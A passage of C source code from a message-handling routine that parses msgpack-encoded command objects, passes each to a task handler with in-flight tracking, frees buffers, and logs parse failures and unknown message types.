                LOG_ERROR("Failed to build single-command envelope for object[%zu]", i);

                if (one_cmd_msg) {

                    MPACK_FREE(one_cmd_msg);

                }

                continue;

            }



            parsed_command_t cmd;

            if (parse_command((const uint8_t*)one_cmd_msg, one_cmd_msg_len, &cmd) == 0) {

                main_inflight_enter("main_command");

                handle_task(c, &cmd);

                main_activity_touch();

                main_inflight_leave("main_command");

                free_parsed_command(&cmd);

            } else {

                LOG_WARN("Failed to parse embedded command object[%zu]", i);

            }



            if (one_cmd_msg) {

                MPACK_FREE(one_cmd_msg);

            }

        }



        mpack_tree_destroy(&tree);

        break;

    }



    



    default:

        LOG_WARN("Unknown message type: %d", msg_type);

        break;

    }

}








